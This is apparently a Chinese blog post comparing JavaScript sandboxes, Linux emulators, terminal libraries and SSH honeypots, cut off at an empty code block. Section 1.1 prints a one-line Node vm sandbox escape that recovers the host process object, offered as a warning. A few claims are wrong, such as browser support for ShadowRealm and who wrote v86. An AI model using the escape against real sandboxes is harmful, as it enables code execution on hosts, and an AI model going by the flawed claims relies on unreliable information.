---
itle: Linux 内核模拟的 JavaScript 方案横向对比
description: 深入分析 JavaScript/TypeScript 中 Linux 环境模拟的各种实现。
date: 2026-05-28authors:
  - fox3000foxy
tags:
  - javascript
  - linux
  - analysis
author_pubkey: "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEQcreZmmVx1U8zFHwsD+JTDIUKtMP5RYijaEkOIqZVfXIKA/i3h0lslw+ZgUBlLXKW3OVA2tGM8svcJWTXDxS8A=="
author_sig: "yrAfvR0Npnuh9Z04apmOw03fHoLTlZD1p2O+7rK1jHBpp7qXdG2Hhfu/rxgYrfrT0yh+Qv6t6tJbuKRV2xfiLQ=="
---

# 所有 JavaScript 沙箱、模拟器、仿真器和蜜罐----横向对比

我在这条兔子洞里已经陷得太深太久了。起因是我在帮 [typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) 这个项目----由 Fortune（后面会详细介绍她）开发的----然后不断有人问"等等，这个和 `v86` 有什么不同？"或"为什么不用 `vm2`？"----我意识到不先把整个生态系统的地图画清楚，我根本没法给出一个清晰的答案。所以现在就有了这篇文章，哈哈。

结果发现有四个不同的家族----JS 沙箱、Linux 仿真器、Linux 模拟器和蜜罐----虽然它们经常被放在一起谈论，但实际上几乎从不重叠。做插件系统的人会用 `isolated-vm`。做 CLI 工具演示的人会用 `v86`。做 SSH 威胁情报的人会用 Cowrie。虽然都在"把代码关在盒子里运行"这个模糊的大伞下，但他们在解决完全不同的问题。

我花了很多时间阅读源代码、CVE 报告、架构文档和 npm 页面来写这篇文章。这篇文章会非常长----去冲杯咖啡吧，说真的。或者两杯。

> 快速声明：`typescript-virtual-container` 在这篇文章中出现频率较高，因为正是它启发了这项研究。我尽量对其他项目保持公平，但请记住这个背景。

---

## 第 0 部分----首先，你实际要解决的是什么问题？

在深入之前，有必要先明确每个家族的用途，因为术语经常混用，人们也总弄混（包括我自己，在我坐下来真正理清之前）。

**JS 沙箱**将 JavaScript 代码与宿主 Node.js 进程隔离开。威胁模型是：不可信的 JS 代码可能调用 `process.exit()`、读取文件或衍生子进程。解决方案是在 V8 执行周围设置一道边界。这些工具没有 Linux shell、带权限的文件系统或 SSH 的概念。

**Linux 仿真器**在 JavaScript 或 WebAssembly 实现的 CPU 仿真器（x86、RISC-V、OR1K）中运行一个真实的、未经修改的 Linux 内核。你启动一个真正的操作系统。获得真正的系统调用。获得与 x86 编译程序的二进制兼容性。开销巨大。

**Linux 模拟器**模拟 Linux 系统的*行为*，但不运行真实内核。它们实现了一个 Shell 解释器、一个虚拟文件系统和足够的 Unix 语义来骗过程和用户。没有内核。没有 Wasm。没有 CPU 仿真。开销低得多。

**蜜罐**旨在吸引攻击者并记录他们的行为。它们主要不是执行环境----而是可观测性工具。对真实 Linux 行为的保真度只要能防止攻击者发现陷阱就足够了。

带着这个框架，以下是本文中每个项目的位置：

```
JS 沙箱:        vm, vm2, isolated-vm, quickjs-emscripten, Deno Workers, ShadowRealm
Linux 仿真器:   v86, JSLinux/TinyEMU, jor1k, CheerpX, WebContainers, container2wasm
Linux 模拟器:   typescript-virtual-container (在此领域独树一帜)
蜜罐:          Cowrie, Kippo, Lyrebird, endlessh, sshesame, node-simple-ssh-honeypot
终端栈:        xterm.js + node-pty (不是隔离器，但密切相关)
```

---

## 第 1 部分----JavaScript 沙箱

### 1.1 `vm` ---- Node.js 内置模块（不是你想的那样）

Node 中最古老的"运行不可信 JS"的答案是内置的 `vm` 模块。它从 v0.1 就有了，所以很多人首先会使用它----然后被坑。

```js
const vm = require("vm");
const sandbox = { answer: 0 };
vm.createContext(sandbox);
vm.runInContext("answer = 6 * 7", sandbox);
console.log(sandbox.answer); // 42
```

`vm` 实际做的事情：它创建一个新的 V8 上下文（一组全新的内置构造函数----`Object`、`Array`、`Function` 等）并在其中运行代码，与你在 `sandbox` 中放的对象共享引用。你的 V8 引擎不变。你的进程不变。内存是共享的。

`vm` 提供不了安全性的原因：JavaScript 的原型链是一个有向无环图，所有东西都连接回 `Object.prototype`。如果你将宿主域中的任何对象放入沙箱，访客可以沿着它的原型链爬升到宿主构造函数。从 `Function` 出发，你可以调用 `Function("return process")()` 恢复出真正的 `process` 对象。游戏结束。立刻。

```js
// 这段代码在 vm 中完美运行----你拿到了真正的 process 对象
vm.runInNewContext(`({}).__proto__.constructor("return process")()`);
```

我是说，Node.js 文档自己都说："vm 模块不是安全机制。不要用它运行不可信代码。"这个警告一直都在。人们一直无视它。我见过生产环境的应用用 `vm` 做沙箱。拜托不要那样做 xD

**结论**：作用域机制，不是沙箱。需要隔离变量作用域时使用（模板引擎、类似 `eval` 的功能且你能控制代码）。永远不要用于不可信输入。

**内存**：开销可忽略----与宿主进程共享同一 V8 堆。
**安全性**：面对有动机的攻击者，毫无安全性。

---

### 1.2 `vm2` ---- 社区的尝试，及其漫长的死亡

`vm2` 是社区对 `vm` 逃逸问题的回答。核心思想是：用 `Proxy` 包裹每个穿越沙箱边界的对象，拦截属性访问，阻止原型链攀爬，过滤掉危险引用。理论上很聪明！实践中呢，我们来看看。

```js
const { VM } = require("vm2");
const vm = new VM({ timeout: 1000, sandbox: {} });
vm.run("process.exit(1)"); // 抛出 VMError，process 不可访问
```

几年内它运行得还不错。但 JavaScript `Proxy` 的攻击面巨大。每一个新的 JS 语言特性----生成器、异步迭代器、`Symbol.toPrimitive`、`Error.prepareStackTrace`、`Promise` 内部槽----都是潜在的绕过向量。

CVE 时间线……真的不一般。来看看：

| 日期 | CVE | 机制 |
|------|-----|-----------|
| 2022 年 10 月 | CVE-2022-36067 | `Error.prepareStackTrace` 宿主上下文逃逸 |
| 2023 年 4 月 | CVE-2023-29017 | 未处理的异步错误栈宿主对象泄漏 |
| 2023 年 4 月 | CVE-2023-29199 | 通过 `handleException()` 绕过异常清理 |
| 2023 年 4 月 | CVE-2023-30547 | `Proxy.getPrototypeOf` → `Function` → RCE |
| 2023 年 5 月 | CVE-2023-32314 | `Error.name` 上的 `Proxy` → `Function` → RCE |
| 2023 年 7 月 | CVE-2023-37466 | 异步函数 + 栈溢出 + `Proxy.getPrototypeOf` |
| 2023 年 7 月 | CVE-2023-37903 | 工作线程 + eval 逃逸 |

同一个月（2023 年 4 月）出现了三个严重 CVE。一个月三个。在 CVE-2023-37903 之后，维护者正式废弃了该库，并附言：*"该库包含严重安全问题，不应用于生产环境。"*

维护者在 2025 年 10 月以 3.10.0 版本复活了它，声称修复了当时已知的所有问题。2026 年 1 月又披露了一个新的严重逃逸漏洞（CVE-2026-22709，CVSS 9.8），随后 2026 年 5 月又批发了 11 个。十一个。模式没有改变，说实话我觉得永远不会改变。

根本问题在于架构----这也是整个生态系统花了很长时间才吸取的教训。你不能用你正在沙箱化的同一种语言、在同一个引擎上、在同一个进程内构建一个安全的沙箱。逃逸面是整个 V8 实现----而 V8 是数百万行持续变化的 C++。每个新的 JS 特性都可能打开一条新的攻击路径。

**结论**：不要用于安全敏感的应用。即使在最新版本上，每几个月就会发现新的绕过方式。维护者本人也公开承认了这一点。

---

### 1.3 `isolated-vm` ---- 真正有效的那一个

`isolated-vm` 采用了正确的方法：使用 V8 自身的隔离原语----Isolate。每个 V8 Isolate 有自己的堆、自己的垃圾回收器、自己的一组内置对象，并且与其他 Isolate 零共享引用。

这与 Chrome 在标签页之间使用的边界相同。它是真正的安全边界，而不是基于 Proxy 的语言级技巧。

```js
import ivm from "isolated-vm";

// 每个 isolate 是自己的 V8 堆
const isolate = new ivm.Isolate({ memoryLimit: 64 }); // MB 上限
const context = await isolate.createContext();
const jail = context.global;

// 跨边界传递数据需要显式序列化
await jail.set("sensitiveData", "not this");
await jail.set("log", new ivm.Reference(console.log));

const script = await isolate.compileScript(`
  // 无法访问宿主进程、宿主堆或宿主模块
  log.applySync(undefined, ["hello from the isolate"]);
`);
await script.run(context);

// 可以在超时或达到内存限制时强制终止
isolate.dispose(); // 释放整个堆
```

`Reference` 和 `ExternalCopy` 类型是显式的通信桥梁。`Reference` 给 isolate 一个宿主函数的可调用句柄----isolate 可以调用它但无法检查其闭包或原型。`ExternalCopy` 将值序列化（结构化克隆）穿过堆边界。这种显式桥梁模式不方便，但这正是隔离真实的原因。

你可以设置硬性资源限制：内存（isolate 超出上限会被终止）、挂墙时钟超时和 CPU 超时。终止是真实的----它杀死整个 V8 Isolate，而不仅仅是一个可能被 `while(true)` 绕过的 JS 超时。

**局限性**：仅限于 JS。你不能在里面运行 bash。没有文件、权限、网络或进程的概念。对于用户提交的 JS（插件、公式、脚本钩子）来说，这是正确的工具，对其他所有事情都是错误的工具。`typescript-virtual-container` 的作者提到她早期考虑过它，后来才意识到"运行 Shell 命令"和"隔离 JavaScript"是根本不同的问题。

**内存**：每个空 Isolate ~3–10 MB，随堆使用增长。
**安全性**：强。V8 Isolate 边界是真正的隔离原语。
**npm**：[isolated-vm](https://www.npmjs.com/package/isolated-vm)
**GitHub**：[laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)

---

### 1.4 `quickjs-emscripten` ---- 编译到 Wasm 的独立 JS 引擎

一种不同的方法：不依赖 V8 内部隔离，而是在完全独立的 JavaScript 引擎中运行，该引擎编译为 WebAssembly。宿主演 V8/Node。访客运行在 QuickJS 内部（QuickJS 在 Wasm 内部）。Wasm 沙箱提供隔离边界。

QuickJS 又是 Fabrice Bellard 的作品（就是那个做了 QEMU、FFmpeg、JSLinux、TinyEMU 的人----这家伙真的不是真人，一个人怎么可能做这么多事情）。它是一个小型、符合规范的 ES2023 JS 引擎，用 C 编写，编译为 Wasm 后只有约 500 KB。

```js
import { getQuickJS } from "quickjs-emscripten";

const QuickJS = await getQuickJS();
const vm = QuickJS.newContext();

const result = vm.evalCode(`
  // 在 QuickJS 中运行，完全独立于 V8
  (function() { return 6 * 7; })()
`);

if (result.error) {
  console.log("Error:", vm.dump(result.error));
  result.error.dispose();
} else {
  console.log("Result:", vm.dump(result.value)); // 42
  result.value.dispose();
}

vm.dispose();
```

QuickJS 是一个符合规范的小型 ES2023 JavaScript 引擎，用 C 编写。编译为 Wasm 后，同步变体约 500 KB，异步（Asyncify）变体约 1 MB。内存管理是手动的----从 VM 中提取的每个值都需要显式释放，这有点烦人，但避免了跨边界 GC 意外。有趣的权衡！

`@sebastianwessel/quickjs` 包装器在之上添加了更友好的 API，带有可选的虚拟文件系统、fetch 支持和 Node.js 模块存根：

```ts
import variant from "@jitl/quickjs-ng-wasmfile-release-sync";
import { loadQuickJs } from "@sebastianwessel/quickjs";

const { runSandboxed } = await loadQuickJs(variant);

const result = await runSandboxed(
  async ({ evalCode }) => evalCode(`
    import { join } from 'path';
    export default join('src', 'dist');
  `),
  { allowFs: false, allowFetch: false }
);
```

安全模型与 `isolated-vm` 不同：Wasm 的线性内存模型意味着访客无法直接访问 V8 堆对象。攻击面是宿主↔Wasm 接口（导入/导出），而不是整个 JS 语言。这通常被认为比基于 Proxy 的沙箱更稳健。

缺点是：QuickJS 没有 V8 那样的优化水平。对于 CPU 密集型的 JS 工作负载，它比 V8 慢 5–20 倍。对于短代码片段和不可信的 eval，这通常不是问题。

**内存**：每个实例约 500 KB Wasm 模块 + 堆。
**安全性**：Wasm 边界，被认为比基于 Proxy 的方法更强。
**npm**：[quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten)、[@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs)
**GitHub**：[justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)

---

### 1.5 Deno ---- 权限优先的运行时

Deno 采取了完全不同的理念：不在 Node 内部做沙箱，而是构建一个默认安全的全新运行时。我真的很喜欢这个思路----说实话，Node.js 从一开始就应该这样。Ryan Dahl（原 Node.js 创建者）做 Deno 的原因之一就是后悔 Node.js 的一些设计决定，想想还挺疯狂的。

每个敏感能力（文件读、文件写、网络、环境变量、子进程）都需要显式的 `--allow-*` 标志：

```bash
# 只能从 /data 读取，其他什么都不能做
deno run --allow-read=/data script.ts

# 只能获取一个域名
deno run --allow-net=api.example.com script.ts

# 没有标志 = 没有任何权限
deno run untrusted.ts # 不能读、写、联网、派生进程
```

权限模型在 Rust/OS 级别实现----它不是 JS 技巧。当 Deno 代码调用 `Deno.readFile()` 时，它会经过一个 Rust 操作，在接触文件系统之前检查权限表。你无法从 JS 绕过它，因为如果没有被授予权限，系统调用根本不会发生。

对于运行真正不可信的代码，Deno Workers（Web Workers）在同一进程中提供了第二个 isolate，每个都有自己的一套权限。你可以生成一个零权限的 worker，并通过 `postMessage` 与之通信。

Deno 2（2024 年 10 月发布）增加了完整的 npm 兼容性和 Node.js 兼容性填充，显著提高了其在服务端用例中的采用率。

**权衡**：Deno 的安全模型非常适合你可能部分信任的代码。对于可能是敌对性的完全不可信代码，权限模型帮不了你----你需要一个 Isolate 边界（`isolated-vm`）或不同的引擎（`quickjs-emscripten`），因为 Deno 仍然运行 V8，老练的攻击者可以找到 V8 级别的漏洞。

---

### 1.6 TC39 ShadowRealm ---- 标准答案（终有一天）

JavaScript 标准机构（TC39）有一个名为 ShadowRealm 的提案，试图标准化 `vm` 和 `vm2` 试图做的事情，但采用正确的安全模型。ShadowRealm 创建一个隔离的 JS 执行上下文，拥有自己的一套内置对象，无法访问外部域，并通过一个精心控制的导入/导出接口进行通信。

```js
const realm = new ShadowRealm();
const result = realm.evaluate(`
  // 独立的内置对象，无法访问外部域
  typeof globalThis.fetch // "undefined"
  6 * 7 // 42
`);
```

ShadowRealm 已在浏览器中可用（Chrome 90+、Firefox 105+），但截至 2026 年尚未在 Node.js 稳定版中实现。TC39 Compartments 提案在此基础上构建，用于模块级隔离。这些是长期的标准化答案，但在服务端 Node 用例中尚未达到生产就绪状态。就像那些你早就知道要来，但就是……还没来的东西。典型的 TC39 xD

---

### 沙箱家族总结

| | `vm` | `vm2` | `isolated-vm` | `quickjs-emscripten` | Deno Workers |
|---|---|---|---|---|---|
| **隔离边界** | 无（仅限作用域） | Proxy（已被攻破） | V8 Isolate | Wasm | V8 Isolate + Rust 权限 |
| **内存上限** | ❌ | ❌ | ✅ 硬限制 | ✅ Wasm 堆 | 部分 |
| **CPU 超时** | ❌ | ✅（可绕过） | ✅ 硬限制 | ✅ | ✅ |
| **安全性** | 无 | 已攻破 | 强 | 强 | 强 |
| **JS 速度** | 原生 V8 | 原生 V8 | 原生 V8 | ~慢 10 倍 | 原生 V8 |
| **浏览器** | ❌ | ❌ | ❌ | ✅ | ❌ |
| **Node 兼容** | 原生 | ✅ | ✅ | 部分填充 | 部分 |
| **状态** | 稳定 | 危险（新 CVE） | ✅ 活跃 | ✅ 活跃 | ✅ 活跃 |
| **RAM 开销** | ~1 MB | ~5–20 MB | ~3–10 MB | ~5–15 MB | ~10–30 MB |

要点：如果你关心安全性，只有两个真正的选择----`isolated-vm`（原生插件、V8 Isolate、全速 JS）和 `quickjs-emscripten`（Wasm、浏览器兼容、计算密集型代码慢约 10 倍）。其他要么是"求你了别用"（`vm`、`vm2`），要么是一个解决完全不同问题的运行时（Deno）。ShadowRealm 最终可能会改变这个格局，但现在还没到。

---

## 第 2 部分----JavaScript 中的 Linux 仿真器

这才是真正让我感兴趣的地方。这些是*真正*的仿真器----它们在 JavaScript 或 WebAssembly 中实现 CPU 指令集、启动真正的 Linux 内核镜像、运行真正的用户态二进制文件。隔离来自于访客和宿主不共享任何东西：不同的内存空间、不同的指令流。

你付出的代价是巨大的，但你得到的东西着实令人惊叹：真正的 Linux，真正在运行，在你的浏览器或 Node.js 进程中。想想就觉得挺疯狂的，对吧？

### 2.1 `v86` ---- JS + Wasm JIT 中的 x86 PC 仿真器

Fabrice（GitHub 用户名 copy）的 `v86` 是 JavaScript 中功能最强大的开源 x86 仿真器。它始于 2013 年左右的纯 JS 解释器，后来演变为一个 JIT 编译系统----x86 基本块被动态翻译为 WebAssembly，大幅提升了性能。

它仿真了以下内容：
- **CPU**：x86-32（IA-32），指令集大致相当于 Pentium 1 级别。不支持 64 位（x86-64）----这是硬架构限制，不是缺少功能。
- **FPU**：通过 JavaScript 的 `Float64Array` 实现。x87 是 80 位扩展精度；JS 双精度浮点是 64 位。这意味着浮点结果可能与真实 CPU 略有不同。
- **内存**：可配置，映射到 JS 堆中的 `SharedArrayBuffer` 或 `ArrayBuffer`。
- **硬件**：8254 PIT（定时器）、8259 PIC（中断控制器）、8042 键盘控制器（PS/2）、CMOS RTC、带 SVGA 扩展和 Bochs VBE 的 VGA、IDE 控制器、软盘控制器（8272A）、NE2000 网卡。
- **BIOS**：使用 SeaBIOS（开源 x86 BIOS）。

JIT 的工作原理是识别基本块（没有跳转的 x86 指令序列），将其翻译为 WebAssembly 函数，缓存该函数，并在同一块后续执行时调用。热代码路径获得原生 Wasm 性能。冷路径回退到 JS 解释器。

```js
import { V86 } from "v86";
import { readFileSync } from "fs";

const emulator = new V86({
  bios:    { buffer: readFileSync("./bios/seabios.bin") },
  vga_bios:{ buffer: readFileSync("./bios/vgabios.bin") },
  hda:     { buffer: readFileSync("./images/alpine.img"), async: false },
  memory_size: 128 * 1024 * 1024, // 128 MB
  autostart: true,
});

// 捕获串口输出（Linux 内核控制台）
emulator.add_listener("serial0-output-byte", byte => {
  process.stdout.write(String.fromCharCode(byte));
});

// 向访客发送输入（在 Shell 中打字）
emulator.serial0_send("ls /\n");
```

**支持的操作系统**：Alpine Linux（极佳）、Ubuntu 16.04/18.04（仅 i386）、Arch Linux 32、ReactOS、FreeDOS、Windows 9x/2000（有局限）、MS-DOS。

**启动时间**：从干净镜像启动 Alpine Linux 需要 15–40 秒。这是内核初始化的固有开销----你无法跳过。是的，你的用户会坐在那里看着内核启动序列在浏览器中滚动。这就是代价 xD

**内存下限**：每个实例 100–256 MB。仅 Wasm JIT 代码缓存就可以在繁忙的 Linux 实例中达到几十 MB。

**Node.js 使用**：完全支持。不需要 DOM----如果你只关心串口，可以丢弃 VGA 输出。

**你不能做的事情**：运行 64 位二进制文件、使用现代内核特性（eBPF、io_uring 等）、或同时运行多个实例而不触及内存限制。

**npm**：[v86](https://www.npmjs.com/package/v86)----持续更新，到本文写作时最新版本就在昨天。
**GitHub**：[copy/v86](https://github.com/copy/v86)
**演示**：[copy.sh/v86](https://copy.sh/v86)

---

### 2.2 JSLinux 和 TinyEMU ---- Bellard 的作品，两次

JSLinux 是 Fabrice Bellard 自己的 JavaScript Linux 仿真器----史上第一个，发布于 2011 年。我在这篇文章中反复提到 Bellard，就因为他一直在出现：QuickJS、TinyEMU、JSLinux、QEMU、FFmpeg。这个男人非同一般。毫不夸张地说，他是软件史上个人技术贡献最令人印象深刻的人物之一。

最初的 JSLinux 是一个纯 JS x86 解释器。2016 年，Bellard 编写了 TinyEMU（一个 RISC-V 仿真器，用 C 语言），通过 Emscripten 编译为 JavaScript，这就成了当前 JSLinux 的基础。所以现在的 JSLinux 实际上是生成 JavaScript 的 C 代码----根本不是手工编写的 JS。

Bellard 网站上的技术说明值得一读：现在的 JSLinux 运行一个 32 或 64 位的 RISC-V CPU（不是 x86），仿真 VirtIO 控制台、VirtIO 网络、VirtIO 块设备和一个用于与主机共享文件的 9P 文件系统。JS 演示使用 Emscripten 从 C 编译----不是手工编写的 JS。

TinyEMU 本身支持：
- RISC-V RV32IMAFDQC 和 RV64IMAFDQC（32 位和 64 位，带浮点、乘法和压缩指令）
- 通过 KVM 支持 x86（仅原生模式，无仿真----所以 JS 版本仅支持 RISC-V）
- VirtIO 控制台、网络、块设备、输入、9P 文件系统

TinyEMU 通过 Emscripten 提供了一个 JavaScript 演示。它是 JSLinux 的基础，也被 `container2wasm` 使用（见第 2.5 节）。

**JSLinux 状态**：没有 npm 包，没有可编程 API。它是在浏览器中打开的演示。历史意义重大----它证明了概念的可行性。作为库的实际用途：无。

**TinyEMU**：不在 npm 上，C 源码在 [bellard.org/tinyemu](https://bellard.org/tinyemu/)。

---

### 2.3 jor1k ---- OR1K 仿真器

jor1k 是 Sebastian Macke 用 JavaScript 编写的 OpenRISC 1000（OR1K）仿真器。它在历史上意义重大，因为 jor1k 引入了 VirtIO 9P 文件系统支持，Bellard 后来将其整合到 TinyEMU 和 JSLinux 中。这些项目之间的交叉授粉非常紧密----它们互相借鉴，说实话，这是开源仿真工作最酷的地方之一。

**状态**：不再积极维护，没有 npm 包。目前已经归档。主要值得从历史角度了解一下----如果有人提起 jor1k，现在你知道它是什么了 :)

---

### 2.4 CheerpX ---- 面向浏览器的商业 x86 仿真器

Leaning Technologies 的 CheerpX 是商业级、面向生产环境的 x86 Linux 仿真器。它不是开源的，但在运行真实的 Debian/Ubuntu 用户态方面比 v86 强大得多。如果你需要在浏览器中运行真正的 VSCode，这就是你要用的。

与 v86 的主要区别：
- 支持更广泛的 ISA（更多 x86 扩展、更好的 glibc 兼容性）
- 浏览器的基于 IndexedDB 的文件系统（页面刷新后持久化）
- 通过 `SharedArrayBuffer` 支持 pthread（需要 COOP/COEP 头----就是那些烦人的安全头）
- 设计用于运行 VSCode、Python、Node.js 和其他真实应用，而不仅仅是最小化 OS 镜像
- 提供专业支持和 SLA（说白了就是出问题了你可以找他们）

典型用例是"在浏览器中运行真正的 Linux 应用，无需服务器"。公司用它来构建基于浏览器的 IDE、编程教程和交互式文档。

```js
// CheerpX API（简化版）
const cx = await CheerpX.Linux.create({
  mounts: [{ type: "ext2", path: "/", dev: CloudDevice.create(...) }],
});
await cx.run("/bin/bash");
```

**Node.js 的故事**：CheerpX 以浏览器为先。底层仿真器理论上可能在 Node 中工作（它是 Wasm），但 API 和文档完全面向浏览器使用。服务端使用不受支持。

**内存**：与 v86 类似----真实 Debian 实例需要 200+ MB。
**定价**：开源项目免费，生产 SaaS 需要商业许可。
**文档**：[cheerpx.io/docs/overview](https://cheerpx.io/docs/overview)

---

### 2.5 WebContainers（StackBlitz）---- Wasm 中的 Node.js，而非 Linux 仿真

WebContainers 经常被归入 Linux 仿真器，但架构完全不同。它们不仿真 x86。它们不启动 Linux。它们运行使用 WASI 编译为 WebAssembly 的 Node.js。这个区别非常重要，我自己也困惑了很久，哈哈。

我觉得混淆来自营销措辞----"在浏览器中运行 Node.js"听起来像是在仿真，但实际上它是 Node.js 本身编译为 Wasm，而不是在虚拟机内运行 Node.js 的 Linux 仿真。完全不同的事情。

架构是：
1. Node.js 编译为 Wasm（具体来说是自定义 WASI 运行时）
2. Service Worker 拦截来自仿真的 Node.js 服务器的网络请求，并将其路由到浏览器标签页
3. 文件系统存在于浏览器内存中（无磁盘 I/O）
4. npm 是针对浏览器内使用优化的自定义实现

```js
import { WebContainer } from "@webcontainer/api";

const webcontainer = await WebContainer.boot();

// 写文件
await webcontainer.mount({
  "index.js": { file: { contents: `console.log("hello")` } },
  "package.json": { file: { contents: `{"name":"demo","type":"module"}` } }
});

// 运行 Node.js 命令
const proc = await webcontainer.spawn("node", ["index.js"]);
proc.output.pipeTo(new WritableStream({ write: chunk => console.log(chunk) }));
```

因为它运行真正的 Node.js（Wasm 编译版），你有真正的 npm、真正的 Node.js API 和真正的模块解析。但你得不到通用的 Linux 用户态----你不能用 `apt` 安装系统包、运行任意编译的二进制文件，或者在 Node.js 生态系统之外做很多事情。

**浏览器要求**：SharedArrayBuffer（需要 COOP/COEP 头）、Service Worker 支持、现代 Wasm。

**Node.js 的故事**：专为浏览器使用设计。API 在浏览器上下文之外无法工作。

**npm**：[@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api)
**文档**：[webcontainers.io](https://webcontainers.io)

---

### 2.6 container2wasm ---- 编译到 Wasm 的 Docker 容器

`container2wasm` 是 NTT 的一个工具（不是 npm 包），它接受一个 Docker 容器镜像并将其转换为一个 WebAssembly 二进制文件，可以在任何 Wasm 宿主中运行----包括浏览器。我第一次看到的时候真的不敢相信它能工作。

机制：
- 对于 x86_64 容器：嵌入 Bochs（一个 x86 仿真器，编译为 Wasm）+ 容器的根文件系统
- 对于 riscv64 容器：嵌入 TinyEMU（又是 Bellard！）+ 容器的根文件系统
- 生成的 `.wasm` 文件启动仿真器、挂载容器文件系统并运行容器的入口点

```bash
# 将 Ubuntu 22.04 容器转换为 Wasm
c2w ubuntu:22.04 out.wasm

# 运行它
wasmtime out.wasm uname -a
# Linux 5.15.0 #1 SMP riscv64 GNU/Linux

# 或者为浏览器使用提供 HTTP 服务
c2w --to-js ubuntu:22.04 /tmp/htdocs/
```

生成的 `.wasm` 很大----最小化的 Ubuntu 也有几百 MB----但它是完全自包含的。你可以通过邮件发给别人一个 `.wasm` 文件，他们就能在浏览器中运行 Ubuntu。这句话理论上说不通，但事实就是如此。

**GitHub**：[container2wasm/container2wasm](https://github.com/container2wasm/container2wasm)

---

### 仿真器家族总结

| | `v86` | JSLinux/TinyEMU | jor1k | CheerpX | WebContainers | container2wasm |
|---|---|---|---|---|---|---|
| **架构** | x86-32 JIT→Wasm | RISC-V (Wasm) | OR1K (JS) | x86（专有） | Node.js→Wasm/WASI | x86/RISC-V (Wasm) |
| **真实内核** | ✅ | ✅ | ✅ | ✅ | ❌ (Node.js) | ✅ |
| **64 位** | ❌ | ✅ (RISC-V) | ❌ | ✅ | 不适用 | ✅ |
| **npm 包** | ✅ | ❌ | ❌ | CDN/API | ✅ | ❌（CLI 工具） |
| **Node.js 使用** | ✅ | ❌ | ❌ | ❌ | ❌（仅浏览器） | 通过 Wasmtime |
| **浏览器使用** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| **每实例 RAM** | 150–256 MB | ~64–128 MB | ~64 MB | 200+ MB | ~100 MB | ~200–500 MB |
| **启动时间** | 15–40 秒 | 10–30 秒 | 10–30 秒 | 15–40 秒 | 2–5 秒 | 10–40 秒 |
| **开源** | ✅ | ✅ | ✅ | ❌ | 部分 | ✅ |
| **状态** | ✅ 非常活跃 | ✅ 稳定 | ⚠️ 已归档 | ✅ 商业产品 | ✅ 活跃 | ✅ 活跃 |

从表中可以看出：`v86` 是唯一同时具备 npm 包、可在浏览器和 Node 中运行且开源的方案。这就是为什么它在"JavaScript Linux 仿真器"的讨论中占据主导地位。其他所有方案都有各自的短板----JSLinux 没有 API、jor1k 已归档、CheerpX 要花钱、WebContainers 仅限浏览器且绑定 Node.js、container2wasm 需要构建步骤和 CLI。如果你只是需要"在 JavaScript 中启动 Linux"，`v86` 几乎总是正确的起点。

---

## 第 3 部分----终端栈：xterm.js 和 node-pty

有两个包在人们构建类似 Shell 的体验时频繁出现。它们不是沙箱或仿真器----它们是 UI 和 PTY 管道----但它们关系如此密切，不提到它们我会过意不去。而且我都用过，它们真的很棒。

### 3.1 `xterm.js` ---- 终端渲染器

xterm.js 是一个面向浏览器的终端仿真器。它在 `<canvas>` 元素中渲染终端屏幕（VT100/xterm 转义序列），处理键盘输入，并暴露出一个用于管道输入输出的 API。

使用者：VS Code 的内置终端、Azure Cloud Shell、Proxmox VE、AWS CloudShell 等。

```js
import { Terminal } from "@xterm/xterm";
import { FitAddon } from "@xterm/addon-fit";

const term = new Terminal({ cursorBlink: true });
const fitAddon = new FitAddon();
term.loadAddon(fitAddon);
term.open(document.getElementById("terminal"));
fitAddon.fit();

// 发送数据到终端（渲染为文字）
term.write("$ ");
term.onData(data => {
  // data 是按键输入----发送到你的后端
  socket.send(data);
});
socket.onmessage(msg => {
  // 来自后端的输出----显示出来
  term.write(msg.data);
});
```

xterm.js 仅仅是渲染层。它不运行 Shell。它不解释命令。它是一个显示组件，让你连接到任何你想要的后端。很多人以为 xterm.js "就是终端"，但它真的只是屏幕----你仍然需要把它连接到实际运行命令的东西上。

**npm**：[@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm)
**GitHub**：[xtermjs/xterm.js](https://github.com/xtermjs/xterm.js)

---

### 3.2 `node-pty` ---- PTY 生成

`node-pty` 在 Node.js 中生成一个伪终端（PTY），并给你一个读/写句柄。与 xterm.js 配合使用，你可以构建一个与服务器上真实 Shell（bash、zsh、fish）对话的浏览器终端。

```js
import * as pty from "node-pty";

const shell = pty.spawn("bash", [], {
  name: "xterm-color",
  cols: 80,
  rows: 30,
  cwd: process.env.HOME,
  env: process.env,
});

shell.onData(data => {
  // 通过 WebSocket 发送到浏览器的 xterm.js
  ws.send(data);
});

ws.on("message", data => {
  // 将浏览器按键输入转发给 Shell
  shell.write(data);
});
```

这是云 IDE 和 Web 终端的标准模式：xterm.js（浏览器）↔ WebSocket ↔ node-pty ↔ 真实 bash。无隔离。Shell 以 Node.js 进程的完整权限运行（或者说运行它的任何用户的权限）。

**维护者**：微软。
**npm**：[node-pty](https://www.npmjs.com/package/node-pty)
**GitHub**：[microsoft/node-pty](https://github.com/microsoft/node-pty)

---

## 第 4 部分----SSH 蜜罐

蜜罐的设计初衷就是被攻击。目标是看起来足够逼真，让攻击者与之交互，同时记录他们所做的一切用于威胁情报。SSH 是主要目标，因为它是互联网上受攻击最多的服务----如果你在公共 IP 上暴露端口 22，几分钟内就会看到自动扫描尝试。你可以试试看，速度之快令人震惊。

蜜罐的质量由两个指标衡量：**保真度**（它冒充真实系统的可信度）和**遥测**（它捕获的有用数据量）。这两者是矛盾的。高保真度的蜜罐更难构建，运维风险也更高。

正是这一节最终引导我构建了 `typescript-virtual-container` 中的 `HoneyPot` 模块，所以对此我有一些观点。

### 4.1 Cowrie ---- 黄金标准

Cowrie 是一个基于 Python 的中等到高交互度的 SSH 和 Telnet 蜜罐。它是研究和安全社区中部署最广泛的 SSH 蜜罐。

架构：
- **协议层**：真实的 SSH 协议实现（Twisted Conch），所以攻击者获得真实的握手、真实的密钥交换、真实的认证
- **Shell 层**：一个伪造的文件系统（模拟 Debian 5.0）和一个对常见命令做出响应的部分 Shell 解释器
- **代理模式**：可以转发到后方的真实系统（高交互模式），记录流经的一切
- **LLM 模式**（最新添加）：使用语言模型对未知命令生成动态响应----是的，Cowrie 现在有了 AI 模式。疯狂的时代。

```python
